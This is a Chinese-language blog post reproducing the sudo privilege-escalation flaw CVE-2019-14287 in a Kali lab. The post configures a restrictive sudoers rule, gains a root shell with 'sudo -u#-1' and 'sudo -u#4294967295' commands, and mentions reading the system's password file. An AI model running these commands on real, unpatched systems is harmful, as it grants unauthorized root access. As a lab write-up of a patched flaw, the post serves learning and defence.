# Linux sudo 权限绕过（CVE-2019-14287） - Yangsir34 - 博客园

> 原文：[`www.cnblogs.com/Yang34/p/11690592.html`](https://www.cnblogs.com/Yang34/p/11690592.html)

2019 年 10 月 14 日，Sudo 官方发布了 Sudo 1.8.28 版本，其中包含 sudo root 权限绕过漏洞的补丁修复。

此漏洞编号是 CVE-2019-14287，当 sudo 配置为允许用户以任意方式运行命令时用户通过 Runas 规范中的 ALL 关键字，可以通过指定用户 ID-1 或 4294967295 以 root 用户身份运行命令。

 影响范围：1.8.28 之前所有版本

漏洞复现 首先本地测试环境查看服务版本 这里为了方便我用的是 kali linux

![](img/1f2d3b44ad6cc321a78b3be1ff95a407.png)

创建一个普通的测试用户

![](img/7d69f53972340aff92422f609101b5ad.png)

接下来进入配置文件/etc/sudoers 修改（这个在-V 看版本的时候也能看的到这个文件） 这里怕改错的可以 cp 一份出来 日后好恢复

添加 yangtestALL=(ALL,!root)  /bin/bash

![](img/2898e9ca9bf68e73a3cee515074c7173.png)

接下来切换用户开始尝试

su 切换用户 可以发现权限并不是 root  而且我们的 yangtest

我们执行 sudo-u#4294967295  /bin/bash 成功获取 root 权限

![](img/4b157b1b93cef4d8ea0dcec1df6121dd.png)

 同理 我们使用 sudo -u#-1 /bin/bash 也是可以的 并且能够成功读取本地测试环境中的用户密码

![](img/9cb05f0370240e52d2eabe8fb249468b.png)

 更多内容，欢迎关注微信公众号：信 Yang 安全，期待与您相遇。